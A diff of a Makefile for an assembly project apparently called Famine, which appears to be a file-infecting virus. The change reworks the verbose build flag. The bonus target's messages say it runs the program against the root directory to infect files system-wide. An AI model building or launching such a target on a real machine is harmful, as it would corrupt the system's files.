@@ -2,11 +2,8 @@
 AS      = nasm
 ASFLAGS = -f elf64 -I includes -I sources
 
-# Verbose mode flag (add -DVERBOSE_MODE when verbose is requested)
+# Verbose mode flag (will be set by verbose target)
 VERBOSE_DEFINE :=
-ifeq ($(MAKECMDGOALS),verbose)
-VERBOSE_DEFINE := -DVERBOSE_MODE
-endif
 
 # Directories
 SRC_DIR  = sources
@@ -73,15 +70,15 @@ fclean: clean
 re: fclean all
 
 # Build with verbose output enabled
-verbose: fclean
-	$(MAKE) VERBOSE_DEFINE=-DVERBOSE_MODE all
+verbose: VERBOSE_DEFINE := -DVERBOSE_MODE
+verbose: fclean all
 
 test: all
 	INSPECT=$(INSPECT_MODE) VERBOSE=$(if $(INSPECT_MODE),1,$(VERBOSE)) ./tests/test_famine.sh $(VERBOSE_FLAG)
 
 bonus: fclean
 	mkdir -p $(OBJ_DIR)
-	$(AS) $(ASFLAGS) -DBONUS_MODE $(SRC_S) -o $(OBJ_DIR)/main.o
+	$(AS) $(ASFLAGS) $(VERBOSE_DEFINE) -DBONUS_MODE $(SRC_S) -o $(OBJ_DIR)/main.o
 	ld $(OBJ_DIR)/main.o -o $(TARGET)
 	@echo "WARNING: About to execute Famine targeting root directory /"
 	@echo "This will attempt to infect all files system-wide."
